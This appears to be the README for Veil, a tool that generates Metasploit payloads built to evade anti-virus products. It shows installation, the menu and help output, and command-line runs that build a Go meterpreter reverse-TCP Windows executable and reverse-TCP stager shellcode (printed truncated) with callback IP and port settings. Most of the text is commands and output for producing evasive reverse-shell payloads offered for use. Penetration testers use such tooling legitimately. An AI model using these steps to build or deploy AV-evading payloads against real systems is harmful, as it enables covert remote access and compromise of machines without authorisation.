
Tool designed to generate metasploit payloads that bypass common anti-virus solutions.  
  
  
Install:
```bash
apt -y install veil  
/usr/share/veil/config/setup.sh --force --silent
```


###### Main Menu:
```bash
$ ./Veil.py  
===============================================================================  
                             Veil | [Version]: 3.1.6  
===============================================================================  
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework  
===============================================================================  
  
Main Menu  
  
  2 tools loaded  
  
Available Tools:  
  
  1)  Evasion  
  2)  Ordnance  
  
Available Commands:  
  
  exit      Completely exit Veil  
  info      Information on a specific tool  
  list      List available tools  
  options     Show Veil configuration  
  update      Update Veil  
  use     Use a specific tool  
  
Veil>:
```


###### Usage:
```bash
$ ./Veil.py --help  
usage: Veil.py [--list-tools] [-t TOOL] [--update] [--setup] [--config]  
               [--version] [--ip IP] [--port PORT] [--list-payloads]  
               [-p [PAYLOAD]] [-o OUTPUT-NAME]  
               [-c [OPTION=value [OPTION=value ...]]]  
               [--msfoptions [OPTION=value [OPTION=value ...]]] [--msfvenom ]  
               [--compiler pyinstaller] [--clean] [--ordnance-payload PAYLOAD]  
               [--list-encoders] [-e ENCODER] [-b \x00\x0a..] [--print-stats]  
  
Veil is a framework containing multiple tools.  
  
[*] Veil Options:  
  --list-tools          List Veil''s tools  
  -t TOOL, --tool TOOL  Specify Veil tool to use (Evasion, Ordnance etc.)  
  --update              Update the Veil framework  
  --setup               Run the Veil framework setup file & regenerate the  
                        configuration  
  --config              Regenerate the Veil framework configuration file  
  --version             Displays version and quits  
  
[*] Callback Settings:  
  --ip IP, --domain IP  IP address to connect back to  
  --port PORT           Port number to connect to  
  
[*] Payload Settings:  
  --list-payloads       Lists all available payloads for that tool  
  
[*] Veil-Evasion Options:  
  -p [PAYLOAD]          Payload to generate  
  -o OUTPUT-NAME        Output file base name for source and compiled binaries  
  -c [OPTION=value [OPTION=value ...]]  
                        Custom payload module options  
  --msfoptions [OPTION=value [OPTION=value ...]]  
                        Options for the specified metasploit payload  
  --msfvenom []         Metasploit shellcode to generate (e.g.  
                        windows/meterpreter/reverse_tcp etc.)  
  --compiler pyinstaller  
                        Compiler option for payload (currently only needed for  
                        Python)  
  --clean               Clean out payload folders  
  
[*] Veil-Ordnance Shellcode Options:  
  --ordnance-payload PAYLOAD  
                        Payload type (bind_tcp, rev_tcp, etc.)  
  
[*] Veil-Ordnance Encoder Options:  
  --list-encoders       Lists all available encoders  
  -e ENCODER, --encoder ENCODER  
                        Name of shellcode encoder to use  
  -b \x00\x0a.., --bad-chars \x00\x0a..  
                        Bad characters to avoid  
  --print-stats         Print information about the encoded shellcode
```

###### Veil Evasion CLI
```bash
$ ./Veil.py -t Evasion -p go/meterpreter/rev_tcp.py --ip 127.0.0.1 --port 4444  
===============================================================================  
                                   Veil-Evasion  
===============================================================================  
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework  
===============================================================================  
  
runtime/internal/sys  
runtime/internal/atomic  
runtime  
errors  
internal/race  
sync/atomic  
math  
sync  
io  
unicode/utf8  
internal/syscall/windows/sysdll  
unicode/utf16  
syscall  
strconv  
reflect  
encoding/binary  
command-line-arguments  
===============================================================================  
                                   Veil-Evasion  
===============================================================================  
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework  
===============================================================================  
  
 [*] Language: go  
 [*] Payload Module: go/meterpreter/rev_tcp  
 [*] Executable written to: /var/lib/veil/output/compiled/payload.exe  
 [*] Source code written to: /var/lib/veil/output/source/payload.go  
 [*] Metasploit Resource file written to: /var/lib/veil/output/handlers/payload.rc  
$  
$ file /var/lib/veil/output/compiled/payload.exe  
/var/lib/veil/output/compiled/payload.exe: PE32 executable (GUI) Intel 80386 (stripped to external PDB), for MS Windows
```

###### Veil Ordnance CLI:
```bash
$ ./Veil.py -t Ordnance --ordnance-payload rev_tcp --ip 127.0.0.1 --port 4444  
===============================================================================  
                                   Veil-Ordnance  
===============================================================================  
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework  
===============================================================================  
  
 [*] Payload Name: Reverse TCP Stager (Stage 1)  
 [*] IP Address: 127.0.0.1  
 [*] Port: 4444  
 [*] Shellcode Size: 287  
  
\xfc\xe8\x86\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\....
```